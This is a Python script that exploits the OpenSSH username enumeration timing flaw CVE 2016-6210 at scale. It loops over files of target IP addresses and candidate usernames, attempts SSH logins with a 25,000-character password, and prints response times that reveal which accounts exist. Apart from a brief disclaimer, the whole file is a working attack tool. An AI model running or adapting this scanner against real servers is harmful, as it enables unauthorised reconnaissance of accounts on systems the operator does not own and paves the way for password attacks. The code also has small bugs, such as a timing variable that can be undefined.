#!/usr/bin/python

import paramiko
import time
import sys

# This script tests OpenSSH servers for the user enumeration bug
# announced on 18th July 2016, Tentatively numbered CVE 2016-6210
# Credit for the base script goes to Eddie Harari on the Full Disclosure ML
# Short, pretty, and works, but I wanted to make it work at scale!
# (And maybe port it to python3, because I'm weird like that)

# As usual, don't do anything stupid/illegal with this.  It's your own damn fault if you do

# TODO add some sort of statistical analysis in order to only print out the significant entries (unless we make current default a verbose mode?)
# TODO fix output of usernames on targets after the first


def main():
    uscount = 0
    ipcount = 0
    results = []
    # Username source file.  Acquired from somewhere else
    filename = raw_input("Enter the file you wish to read usernames from: \n")

    try:
        user_file = open(filename,"r")
    except IOError:
        print("I'm having trouble opening the file."
                "Please check the name and path")

    user_file_length = getlines(filename)
    # Get the target IP addresses
    target_name = raw_input("Enter the file containing IP addresses "
                        "you'd like to test: \n")
    try:
        target_file = open(target_name,"r")
    except IOError:
        print("I'm having trouble opening the file."
                "Please check the name and path")

    target_file_length = getlines(target_name)

    try:
        while(ipcount < target_file_length):
            # Get target from the file, THEN the user in the subloop
            target = target_file.readline()
            while(uscount < user_file_length):
                user = user_file.readline()
                p = 'A'*25000
                ssh = paramiko.SSHClient()
                starttime = time.clock()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                try:
                    ssh.connect(target, username = str(user),
                               password = p)
                except KeyboardInterrupt:
                    print("Interrupt found.  Exiting")
                    sys.exit(0)
                except:
                    endtime = time.clock()
                    total = endtime - starttime

                # placeholder output - final should give only statistically-significant results (ie usernames we care about)
                print("Time for " + user + "on " + target + ": " + str(total))

                # results array call goes here for later use
                uscount += 1
            uscount = 0 # reset uscount, so we can enter the test again with another IP address
            user_file.seek(0) # reset our place in the users file
            ipcount += 1
    except KeyboardInterrupt:
        print("Keyboard Interrupt found.  Exiting")
        sys.exit(0)

def getlines(filename):
    with open(filename) as f:
        for i, l in enumerate(f):
            pass
    return i + 1
main()
